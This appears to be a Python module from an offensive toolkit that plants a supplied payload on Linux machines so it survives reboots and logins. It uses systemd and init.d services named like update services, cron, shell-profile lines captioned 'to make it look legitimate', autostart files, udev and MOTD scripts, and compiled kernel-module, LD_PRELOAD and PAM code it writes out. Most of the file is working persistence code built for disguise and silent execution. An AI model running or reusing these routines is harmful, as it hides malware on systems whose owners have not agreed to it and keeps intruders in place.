"""
Linux Persistence Mechanisms

Implements various persistence techniques for Linux systems including
systemd services, cron jobs, shell profiles, and kernel modules.
"""

import logging
import os
import subprocess
import tempfile
from typing import Any, Dict, List, Tuple

from .base_persistence import BasePersistence

logger = logging.getLogger(__name__)


class LinuxPersistence(BasePersistence):
    """
    Linux-specific persistence implementation with multiple techniques.
    """

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.LinuxPersistence")
        self.persistence_methods = {
            'systemd_service': self._systemd_service_persistence,
            'init_d_service': self._init_d_service_persistence,
            'cron_job': self._cron_job_persistence,
            'shell_profile': self._shell_profile_persistence,
            'bash_profile': self._bash_profile_persistence,
            'desktop_autostart': self._desktop_autostart_persistence,
            'kernel_module': self._kernel_module_persistence,
            'library_preload': self._library_preload_persistence,
            'ssh_authorized_keys': self._ssh_authorized_keys_persistence,
            'udev_rules': self._udev_rules_persistence,
            'motd_script': self._motd_script_persistence,
            'pam_module': self._pam_module_persistence
        }

        # Common persistence locations
        self.persistence_locations = {
            'systemd_user': '~/.config/systemd/user/',
            'systemd_system': '/etc/systemd/system/',
            'init_d': '/etc/init.d/',
            'cron_d': '/etc/cron.d/',
            'cron_user': '/var/spool/cron/crontabs/',
            'bashrc': '~/.bashrc',
            'bash_profile': '~/.bash_profile',
            'profile': '~/.profile',
            'desktop_autostart': '~/.config/autostart/',
            'ld_preload': '/etc/ld.so.preload',
            'ssh_keys': '~/.ssh/authorized_keys',
            'udev_rules': '/etc/udev/rules.d/',
            'motd': '/etc/update-motd.d/',
            'pam_modules': '/lib/security/'
        }

    def get_default_method(self) -> str:
        """Get the default persistence method for Linux."""
        return 'systemd_service'

    def list_available_methods(self) -> list:
        """List all available persistence methods for Linux."""
        return list(self.persistence_methods.keys())

    def _systemd_service_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via systemd service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get('service_name', 'system-update')
            use_user_service = options.get('use_user_service', True)

            # Determine service directory
            if use_user_service:
                service_dir = os.path.expanduser(self.persistence_locations['systemd_user'])
                service_path = os.path.join(service_dir, f"{service_name}.service")
            else:
                service_dir = self.persistence_locations['systemd_system']
                service_path = os.path.join(service_dir, f"{service_name}.service")

            # Create service directory if needed
            os.makedirs(service_dir, exist_ok=True)

            # Generate service file content
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=10
User={options.get('user', 'root')}

[Install]
WantedBy=multi-user.target
"""

            # Write service file
            with open(service_path, 'w') as f:
                f.write(service_content)

            # Set proper permissions
            os.chmod(service_path, 0o644)

            # Enable and start service
            service_cmd = 'systemctl --user' if use_user_service else 'systemctl'

            enable_cmd = f'{service_cmd} enable {service_name}.service'
            start_cmd = f'{service_cmd} start {service_name}.service'

            enable_result = subprocess.run(enable_cmd, shell=True, capture_output=True, text=True)
            start_result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True)

            # Use shared subprocess result handler
            success, details, cleanup_info = self.handle_subprocess_result(enable_result, details, cleanup_info)

            if success:
                # Add success details
                additional_details = {
                    'service_name': service_name,
                    'service_path': service_path,
                    'service_type': 'user' if use_user_service else 'system',
                    'enabled': True,
                    'started': start_result.returncode == 0
                }

                cleanup_info.update({
                    'type': 'systemd_service',
                    'service_name': service_name,
                    'service_path': service_path,
                    'user_service': use_user_service
                })

                return self.create_success_result(details, cleanup_info, additional_details)
            else:
                return success, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _init_d_service_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via init.d service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get('service_name', 'sysupdate')
            script_path = os.path.join(self.persistence_locations['init_d'], service_name)

            # Generate init.d script
            script_content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {service_name}
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       System maintenance and update service
### END INIT INFO

DAEMON="{payload_path}"
NAME="{service_name}"
PIDFILE="/var/run/$NAME.pid"

case "$1" in
    start)
        echo "Starting $NAME"
        start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON --background --make-pidfile
        ;;
    stop)
        echo "Stopping $NAME"
        start-stop-daemon --stop --quiet --pidfile $PIDFILE
        rm -f $PIDFILE
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart}}"
        exit 1
        ;;
esac

exit 0
"""

            # Write script file
            with open(script_path, 'w') as f:
                f.write(script_content)

            # Set executable permissions
            os.chmod(script_path, 0o755)

            # Add to startup
            update_rc_cmd = f'update-rc.d {service_name} defaults'
            result = subprocess.run(update_rc_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details['service_name'] = service_name
                details['script_path'] = script_path
                details['registered'] = True

                cleanup_info['type'] = 'init_d_service'
                cleanup_info['service_name'] = service_name
                cleanup_info['script_path'] = script_path

                return True, details, cleanup_info
            
            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _cron_job_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via cron job."""
        details, cleanup_info = self.init_persistence_data()

        try:
            schedule = options.get('schedule', '@reboot')
            use_system_cron = options.get('use_system_cron', False)

            if use_system_cron:
                # System-wide cron job
                job_name = options.get('job_name', 'system-maintenance')
                cron_file = f'/etc/cron.d/{job_name}'

                cron_entry = f'{schedule} root {payload_path} >/dev/null 2>&1\n'

                with open(cron_file, 'w') as f:
                    f.write(cron_entry)

                os.chmod(cron_file, 0o644)

                details['cron_file'] = cron_file
                cleanup_info['type'] = 'cron_file'
                cleanup_info['file_path'] = cron_file

            else:
                # User cron job
                cron_entry = f'{schedule} {payload_path} >/dev/null 2>&1'

                # Add to user's crontab
                cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                if result.returncode != 0:
                    details['error'] = result.stderr
                    return False, details, cleanup_info

                cleanup_info['type'] = 'cron_entry'
                cleanup_info['entry'] = cron_entry

            return self.create_success_result(details, cleanup_info, {
                'schedule': schedule,
                'payload_path': payload_path,
                'system_wide': use_system_cron
            })

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _shell_profile_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via shell profile."""
        details, cleanup_info = self.init_persistence_data()

        try:
            profile_type = options.get('profile_type', 'bashrc')
            hide_execution = options.get('hide_execution', True)

            # Map profile types to file paths
            profile_files = {
                'bashrc': os.path.expanduser(self.persistence_locations['bashrc']),
                'bash_profile': os.path.expanduser(self.persistence_locations['bash_profile']),
                'profile': os.path.expanduser(self.persistence_locations['profile'])
            }

            if profile_type not in profile_files:
                details['error'] = f"Unknown profile type: {profile_type}"
                return False, details, cleanup_info

            profile_path = profile_files[profile_type]

            # Generate shell command
            if hide_execution:
                shell_cmd = f'{payload_path} >/dev/null 2>&1 &'
            else:
                shell_cmd = f'{payload_path} &'

            # Add comment to make it look legitimate
            profile_entry = f"""
# System maintenance script
if [ -f "{payload_path}" ]; then
    {shell_cmd}
fi
"""

            # Append to profile file
            with open(profile_path, 'a') as f:
                f.write(profile_entry)

            details['profile_type'] = profile_type
            details['profile_path'] = profile_path
            details['entry'] = profile_entry.strip()
            details['hidden'] = hide_execution

            cleanup_info['type'] = 'shell_profile'
            cleanup_info['profile_path'] = profile_path
            cleanup_info['entry'] = profile_entry.strip()

            return True, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _bash_profile_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via .bash_profile."""
        options['profile_type'] = 'bash_profile'
        return self._shell_profile_persistence(payload_path, options)

    def _desktop_autostart_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via desktop autostart."""
        details, cleanup_info = self.init_persistence_data()

        try:
            app_name = options.get('app_name', 'System Monitor')
            desktop_file = options.get('desktop_file', 'system-monitor.desktop')

            autostart_dir = os.path.expanduser(self.persistence_locations['desktop_autostart'])
            os.makedirs(autostart_dir, exist_ok=True)

            desktop_path = os.path.join(autostart_dir, desktop_file)

            # Generate .desktop file
            desktop_content = f"""[Desktop Entry]
Type=Application
Name={app_name}
Comment=System monitoring application
Exec={payload_path}
Icon=utilities-system-monitor
Terminal=false
Hidden=false
X-GNOME-Autostart-enabled=true
"""

            with open(desktop_path, 'w') as f:
                f.write(desktop_content)

            os.chmod(desktop_path, 0o644)

            details['app_name'] = app_name
            details['desktop_file'] = desktop_file
            details['desktop_path'] = desktop_path
            details['autostart_dir'] = autostart_dir

            cleanup_info['type'] = 'desktop_file'
            cleanup_info['file_path'] = desktop_path

            return True, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _kernel_module_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via kernel module."""
        details, cleanup_info = self.init_persistence_data()

        try:
            module_name = options.get('module_name', 'sys_monitor')

            # Generate kernel module source
            module_source = self._generate_kernel_module(payload_path, module_name)

            # Create temporary directory for module compilation
            with tempfile.TemporaryDirectory() as temp_dir:
                module_dir = os.path.join(temp_dir, module_name)
                os.makedirs(module_dir)

                # Write module source
                source_path = os.path.join(module_dir, f'{module_name}.c')
                with open(source_path, 'w') as f:
                    f.write(module_source)

                # Write Makefile
                makefile_path = os.path.join(module_dir, 'Makefile')
                makefile_content = f"""obj-m += {module_name}.o

all:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
"""
                with open(makefile_path, 'w') as f:
                    f.write(makefile_content)

                # Compile module
                compile_result = subprocess.run('make', cwd=module_dir,
                                              capture_output=True, text=True)

                if compile_result.returncode == 0:
                    # Install module
                    module_ko = os.path.join(module_dir, f'{module_name}.ko')
                    install_path = f'/lib/modules/{os.uname().release}/extra/{module_name}.ko'

                    os.makedirs(os.path.dirname(install_path), exist_ok=True)
                    subprocess.run(['cp', module_ko, install_path])

                    # Update module dependencies
                    subprocess.run(['depmod', '-a'])

                    # Load module
                    subprocess.run(['insmod', install_path])

                    details['module_name'] = module_name
                    details['install_path'] = install_path
                    details['compiled'] = True
                    details['loaded'] = True

                    cleanup_info['type'] = 'kernel_module'
                    cleanup_info['module_name'] = module_name
                    cleanup_info['install_path'] = install_path

                    return True, details, cleanup_info
                else:
                    details['error'] = f"Module compilation failed: {compile_result.stderr}"
                    return False, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _library_preload_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via LD_PRELOAD."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Create shared library that executes payload
            lib_name = options.get('lib_name', 'libsystem.so')
            lib_path = f'/tmp/{lib_name}'

            # Generate shared library source
            lib_source = self._generate_preload_library(payload_path)

            # Compile to shared library
            source_path = f'/tmp/{lib_name}.c'
            with open(source_path, 'w') as f:
                f.write(lib_source)

            compile_cmd = f'gcc -shared -fPIC -o {lib_path} {source_path}'
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                # Add to LD_PRELOAD
                preload_file = self.persistence_locations['ld_preload']

                with open(preload_file, 'a') as f:
                    f.write(f'{lib_path}\n')

                details['lib_name'] = lib_name
                details['lib_path'] = lib_path
                details['preload_file'] = preload_file

                cleanup_info['type'] = 'library_preload'
                cleanup_info['lib_path'] = lib_path
                cleanup_info['preload_file'] = preload_file

                # Cleanup source file
                os.remove(source_path)

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _ssh_authorized_keys_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via SSH authorized_keys."""
        details, cleanup_info = self.init_persistence_data()

        try:
            ssh_key = options.get('ssh_key', self._generate_ssh_key())
            key_comment = options.get('key_comment', 'system-maintenance')

            authorized_keys_path = os.path.expanduser(self.persistence_locations['ssh_keys'])
            ssh_dir = os.path.dirname(authorized_keys_path)

            # Create .ssh directory if needed
            os.makedirs(ssh_dir, exist_ok=True)
            os.chmod(ssh_dir, 0o700)

            # Generate key entry with command restriction
            key_entry = f'command="{payload_path}" {ssh_key} {key_comment}\n'

            # Append to authorized_keys
            with open(authorized_keys_path, 'a') as f:
                f.write(key_entry)

            os.chmod(authorized_keys_path, 0o600)

            details['ssh_key'] = ssh_key
            details['key_comment'] = key_comment
            details['authorized_keys_path'] = authorized_keys_path
            details['key_entry'] = key_entry.strip()

            cleanup_info['type'] = 'ssh_key'
            cleanup_info['authorized_keys_path'] = authorized_keys_path
            cleanup_info['key_entry'] = key_entry.strip()

            return True, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _udev_rules_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via udev rules."""
        details, cleanup_info = self.init_persistence_data()

        try:
            rule_name = options.get('rule_name', '99-system-monitor.rules')
            rule_path = os.path.join(self.persistence_locations['udev_rules'], rule_name)

            # Generate udev rule
            rule_content = f'''# System monitoring rule
ACTION=="add", SUBSYSTEM=="usb", RUN+="{payload_path}"
ACTION=="add", SUBSYSTEM=="block", RUN+="{payload_path}"
'''

            with open(rule_path, 'w') as f:
                f.write(rule_content)

            os.chmod(rule_path, 0o644)

            # Reload udev rules
            subprocess.run(['udevadm', 'control', '--reload-rules'])

            details['rule_name'] = rule_name
            details['rule_path'] = rule_path
            details['rule_content'] = rule_content

            cleanup_info['type'] = 'udev_rule'
            cleanup_info['rule_path'] = rule_path

            return True, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _motd_script_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via MOTD script."""
        details, cleanup_info = self.init_persistence_data()

        try:
            script_name = options.get('script_name', '90-system-status')
            script_path = os.path.join(self.persistence_locations['motd'], script_name)

            # Generate MOTD script
            script_content = f'''#!/bin/bash
# System status script

# Execute system maintenance
{payload_path} >/dev/null 2>&1 &

# Display system information
echo "System Status: OK"
echo "Last Update: $(date)"
'''

            with open(script_path, 'w') as f:
                f.write(script_content)

            os.chmod(script_path, 0o755)

            details['script_name'] = script_name
            details['script_path'] = script_path

            cleanup_info['type'] = 'motd_script'
            cleanup_info['script_path'] = script_path

            return True, details, cleanup_info

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)

    def _pam_module_persistence(self, payload_path: str, options: Dict[str, Any]) -> Tuple[bool, Dict, Dict]:
        """Establish persistence via PAM module."""
        details, cleanup_info = self.init_persistence_data()

        try:
            module_name = options.get('module_name', 'pam_system')

            # Generate PAM module source
            pam_source = self._generate_pam_module(payload_path, module_name)

            # Compile PAM module
            source_path = f'/tmp/{module_name}.c'
            module_path = f'{self.persistence_locations["pam_modules"]}{module_name}.so'

            with open(source_path, 'w') as f:
                f.write(pam_source)

            compile_cmd = f'gcc -shared -fPIC -lpam -o {module_path} {source_path}'
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                # Add to PAM configuration
                pam_config = '/etc/pam.d/common-session'
                pam_entry = f'session optional {module_name}.so\n'

                with open(pam_config, 'a') as f:
                    f.write(pam_entry)

                details['module_name'] = module_name
                details['module_path'] = module_path
                details['pam_config'] = pam_config

                cleanup_info['type'] = 'pam_module'
                cleanup_info['module_path'] = module_path
                cleanup_info['pam_config'] = pam_config
                cleanup_info['pam_entry'] = pam_entry.strip()

                # Cleanup source file
                os.remove(source_path)

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            return self.handle_persistence_error(e, details, cleanup_info)
    def remove_persistence(self, cleanup_info: Dict[str, Any]) -> bool:
        """Remove established persistence."""
        try:
            cleanup_type = cleanup_info.get('type')

            if cleanup_type == 'systemd_service':
                service_name = cleanup_info['service_name']
                service_path = cleanup_info['service_path']
                user_service = cleanup_info.get('user_service', False)

                service_cmd = 'systemctl --user' if user_service else 'systemctl'

                # Use common service cleanup pattern
                service_commands = {
                    'stop': f'{service_cmd} stop {service_name}.service',
                    'disable': f'{service_cmd} disable {service_name}.service'
                }

                return self.cleanup_service_common_pattern(service_name, service_commands, service_path)

            elif cleanup_type == 'init_d_service':
                service_name = cleanup_info['service_name']
                script_path = cleanup_info['script_path']

                # Remove from startup
                subprocess.run(f'update-rc.d {service_name} remove', shell=True)

                # Remove script
                if os.path.exists(script_path):
                    os.remove(script_path)

                return True

            elif cleanup_type == 'cron_file':
                file_path = cleanup_info['file_path']
                if os.path.exists(file_path):
                    os.remove(file_path)
                    return True

            elif cleanup_type == 'cron_entry':
                entry = cleanup_info['entry']
                # Remove from user crontab
                cmd = f'crontab -l | grep -v "{entry}" | crontab -'
                subprocess.run(cmd, shell=True)
                return True

            elif cleanup_type == 'shell_profile':
                profile_path = cleanup_info['profile_path']
                entry = cleanup_info['entry']

                if os.path.exists(profile_path):
                    # Read current content
                    with open(profile_path, 'r') as f:
                        content = f.read()

                    # Remove our entry
                    new_content = content.replace(entry, '')

                    # Write back
                    with open(profile_path, 'w') as f:
                        f.write(new_content)

                return True

            elif cleanup_type == 'desktop_file':
                file_path = cleanup_info['file_path']
                if os.path.exists(file_path):
                    os.remove(file_path)
                    return True

            elif cleanup_type == 'kernel_module':
                module_name = cleanup_info['module_name']
                install_path = cleanup_info['install_path']

                # Unload module
                subprocess.run(['rmmod', module_name], capture_output=True)

                # Remove module file
                if os.path.exists(install_path):
                    os.remove(install_path)

                # Update dependencies
                subprocess.run(['depmod', '-a'])
                return True

            elif cleanup_type == 'library_preload':
                lib_path = cleanup_info['lib_path']
                preload_file = cleanup_info['preload_file']

                # Remove from LD_PRELOAD file
                if os.path.exists(preload_file):
                    with open(preload_file, 'r') as f:
                        lines = f.readlines()

                    # Filter out our library
                    new_lines = [line for line in lines if lib_path not in line]

                    with open(preload_file, 'w') as f:
                        f.writelines(new_lines)

                # Remove library file
                if os.path.exists(lib_path):
                    os.remove(lib_path)

                return True

            elif cleanup_type == 'ssh_key':
                authorized_keys_path = cleanup_info['authorized_keys_path']
                key_entry = cleanup_info['key_entry']

                if os.path.exists(authorized_keys_path):
                    with open(authorized_keys_path, 'r') as f:
                        lines = f.readlines()

                    # Filter out our key
                    new_lines = [line for line in lines if key_entry not in line]

                    with open(authorized_keys_path, 'w') as f:
                        f.writelines(new_lines)

                return True

            elif cleanup_type == 'udev_rule':
                rule_path = cleanup_info['rule_path']
                if os.path.exists(rule_path):
                    os.remove(rule_path)
                    # Reload udev rules
                    subprocess.run(['udevadm', 'control', '--reload-rules'])
                    return True

            elif cleanup_type == 'motd_script':
                script_path = cleanup_info['script_path']
                if os.path.exists(script_path):
                    os.remove(script_path)
                    return True

            elif cleanup_type == 'pam_module':
                module_path = cleanup_info['module_path']
                pam_config = cleanup_info['pam_config']
                pam_entry = cleanup_info['pam_entry']

                # Remove from PAM config
                if os.path.exists(pam_config):
                    with open(pam_config, 'r') as f:
                        lines = f.readlines()

                    new_lines = [line for line in lines if pam_entry not in line]

                    with open(pam_config, 'w') as f:
                        f.writelines(new_lines)

                # Remove module
                if os.path.exists(module_path):
                    os.remove(module_path)

                return True

            return False

        except Exception as e:
            return self.handle_remove_persistence_error(e)

    def _generate_kernel_module(self, payload_path: str, module_name: str) -> str:
        """Generate kernel module source code."""
        return f"""#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("System Monitor Module");
MODULE_VERSION("1.0");

static int __init {module_name}_init(void) {{
    char *argv[] = {{ "{payload_path}", NULL }};
    char *envp[] = {{ "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL }};
    
    printk(KERN_INFO "{module_name}: Module loaded\\n");
    
    // Execute payload
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    
    return 0;
}}

static void __exit {module_name}_exit(void) {{
    printk(KERN_INFO "{module_name}: Module unloaded\\n");
}}

module_init({module_name}_init);
module_exit({module_name}_exit);
"""

    def _generate_preload_library(self, payload_path: str) -> str:
        """Generate LD_PRELOAD library source code."""
        return f"""#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

static void execute_payload(void) __attribute__((constructor));

static void execute_payload(void) {{
    if (fork() == 0) {{
        execl("{payload_path}", "{payload_path}", (char *)NULL);
        exit(0);
    }}
}}

// Override a common function to ensure loading
int __libc_start_main(int (*main)(int, char **, char **),
                      int argc, char **argv,
                      int (*init)(int, char **, char **),
                      void (*fini)(void),
                      void (*rtld_fini)(void),
                      void *stack_end) {{
    
    // Get original function
    int (*orig_main)(int (*)(int, char **, char **),
                     int, char **,
                     int (*)(int, char **, char **),
                     void (*)(void),
                     void (*)(void),
                     void *) = dlsym(RTLD_NEXT, "__libc_start_main");
    
    // Execute our payload
    execute_payload();
    
    // Call original function
    return orig_main(main, argc, argv, init, fini, rtld_fini, stack_end);
}}
"""

    def _generate_pam_module(self, payload_path: str, module_name: str) -> str:
        """Generate PAM module source code."""
        return f"""#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {{
    pid_t pid = fork();
    
    if (pid == 0) {{
        // Child process - execute payload
        execl("{payload_path}", "{payload_path}", (char *)NULL);
        exit(0);
    }} else if (pid > 0) {{
        // Parent process - don't wait
        return PAM_SUCCESS;
    }}
    
    return PAM_SUCCESS;
}}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {{
    return PAM_SUCCESS;
}}
"""

    def _generate_ssh_key(self) -> str:
        """Generate a fake SSH public key."""
        # This is a dummy key for demonstration
        return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7"

    def list_persistence_methods(self) -> List[str]:
        """Get list of available persistence methods."""
        return list(self.persistence_methods.keys())

    def generate_persistence_code(self, method: str, module_name: str = 'system_module') -> str:
        """Generate code for specific persistence method."""
        if method == 'systemd_service':
            return self._generate_systemd_code(module_name)
        elif method == 'cron_job':
            return self._generate_cron_code()
        elif method == 'shell_profile':
            return self._generate_shell_code()
        else:
            return "// Code generation not implemented for this method"

    def _generate_systemd_code(self, module_name: str = 'system_service') -> str:
        """Generate C code for systemd service persistence."""
        return """
// Systemd Service Persistence - """ + module_name + """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

int create_systemd_persistence(const char *payload_path, const char *service_name) {{
    char service_path[512];
    char service_content[1024];
    FILE *fp;
    
    // Create service file path
    snprintf(service_path, sizeof(service_path), 
             "/home/%s/.config/systemd/user/%s.service", 
             getenv("USER"), service_name);
    
    // Create service content for """ + module_name + """
    snprintf(service_content, sizeof(service_content),
             "[Unit]\\n"
             "Description=""" + module_name + """ Service\\n"
             "After=network.target\\n\\n"
             "[Service]\\n"
             "Type=simple\\n"
             "ExecStart=%s\\n"
             "Restart=always\\n"
             "RestartSec=10\\n\\n"
             "[Install]\\n"
             "WantedBy=default.target\\n",
             payload_path);
    
    // Write service file
    fp = fopen(service_path, "w");
    if (!fp) return -1;
    
    fputs(service_content, fp);
    fclose(fp);
    
    // Set permissions
    chmod(service_path, 0644);
    
    // Enable and start service
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "systemctl --user enable %s.service", service_name);
    system(cmd);
    
    snprintf(cmd, sizeof(cmd), "systemctl --user start %s.service", service_name);
    system(cmd);
    
    return 0;
}

// Usage example for """ + module_name + """
create_systemd_persistence("/path/to/payload", \"""" + module_name + """\");
"""

    def _generate_cron_code(self) -> str:
        """Generate C code for cron job persistence."""
        return """
// Cron Job Persistence
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int create_cron_persistence(const char *payload_path, const char *schedule) {
    char cmd[512];
    
    // Add cron job
    snprintf(cmd, sizeof(cmd), 
             "(crontab -l 2>/dev/null; echo \"%s %s >/dev/null 2>&1\") | crontab -",
             schedule, payload_path);
    
    return system(cmd);
}

// Usage
create_cron_persistence("/path/to/payload", "@reboot");
"""

    def _generate_shell_code(self) -> str:
        """Generate C code for shell profile persistence."""
        return """
// Shell Profile Persistence
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int create_shell_persistence(const char *payload_path, const char *profile_file) {
    char profile_path[512];
    char profile_entry[512];
    FILE *fp;
    
    // Get full profile path
    snprintf(profile_path, sizeof(profile_path), 
             "/home/%s/%s", getenv("USER"), profile_file);
    
    // Create profile entry
    snprintf(profile_entry, sizeof(profile_entry),
             "\\n# System maintenance script\\n"
             "if [ -f \"%s\" ]; then\\n"
             "    %s >/dev/null 2>&1 &\\n"
             "fi\\n",
             payload_path, payload_path);
    
    // Append to profile
    fp = fopen(profile_path, "a");
    if (!fp) return -1;
    
    fputs(profile_entry, fp);
    fclose(fp);
    
    return 0;
}

// Usage
create_shell_persistence("/path/to/payload", ".bashrc");
"""
